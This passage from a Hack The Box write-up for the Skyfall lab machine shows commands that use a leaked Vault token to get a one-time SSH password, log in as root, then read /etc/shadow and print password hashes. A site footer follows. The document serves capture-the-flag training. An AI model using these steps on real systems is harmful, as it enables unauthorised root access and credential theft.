+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> VAULT_ADDR=http://prd23-vault-internal.skyfall.htb</span><br><span class="line"><span class="built_in">export</span> VAULT_TOKEN=hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line"><span class="built_in">export</span> REMOTE_HOST_IP=10.129.11.227</span><br><span class="line">./vault ssh -mode otp root@10.129.11.227              </span><br><span class="line"></span><br><span class="line">WARNING: No -role specified. Use -role to tell Vault <span class="built_in">which</span> ssh role to use <span class="keyword">for</span></span><br><span class="line">authentication. In the future, you will need to tell Vault <span class="built_in">which</span> role to use.</span><br><span class="line">For now, Vault will attempt to guess based on the API response. This will be</span><br><span class="line">removed <span class="keyword">in</span> the Vault 1.1.</span><br><span class="line">Error choosing role: Roles: <span class="string">&quot;admin_otp_key_role, dev_otp_key_role&quot;</span>. </span><br><span class="line">                        Multiple roles are registered <span class="keyword">for</span> this IP.</span><br><span class="line">                        Select a role using <span class="string">&#x27;-role&#x27;</span> option.</span><br><span class="line">                        Note that all roles may not be permitted, based on ACLs.</span><br></pre></td></tr></table></figure>
+
+<p>​<code>admin_otp_key_role</code>​ 和 <code>dev_otp_key_role</code>​ 選一個， 剛才選了 <code>dev_otp_key_role</code>​，現在就嘗試下 <code>admin_otp_key_role</code>​。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> VAULT_ADDR=http://prd23-vault-internal.skyfall.htb</span><br><span class="line"><span class="built_in">export</span> VAULT_TOKEN=hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line"><span class="built_in">export</span> REMOTE_HOST_IP=10.129.11.227</span><br><span class="line">./vault ssh -role admin_otp_key_role  -mode otp root@10.129.11.227 </span><br><span class="line"></span><br><span class="line">Vault could not locate <span class="string">&quot;sshpass&quot;</span>. The OTP code <span class="keyword">for</span> the session is displayed</span><br><span class="line">below. Enter this code <span class="keyword">in</span> the SSH password prompt. If you install sshpass,</span><br><span class="line">Vault can automatically perform this step <span class="keyword">for</span> you.</span><br><span class="line">OTP <span class="keyword">for</span> the session is: 30e1361a-10c3-d404-e923-5f283bc3baf7</span><br><span class="line">(root@10.129.11.227) Password: </span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">&#x27;unminimize&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Mon Feb  5 08:11:24 2024 from 10.10.16.2</span><br><span class="line">root@skyfall:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="hashes"><a href="#hashes" class="headerlink" title="hashes"></a>hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@skyfall:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$4uH0lUFbgz7XKRP4f</span>/FgP.<span class="variable">$gEGN1NQvQhD2aRx452dXMDPZm67IbrFtfzxH</span>.6smSl7:19669:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19639:0:99999:7:::</span><br><span class="line">askyy:$y$j9T<span class="variable">$2AbGppWMps3JvtLZF2M0z</span>/<span class="variable">$nXpvYtHOjqCBu9NN3Y24c</span>/Yu89tZxhF4gwreW8VSLc8:19669:0:99999:7:::</span><br><span class="line">_laurel:!:19745::::::</span><br><span class="line">root@skyfall:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&text=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&is_video=false&description=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Skyfall - Patch&body=Check out this article: https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&name=HackTheBox - Machine - Skyfall - Patch&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&t=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
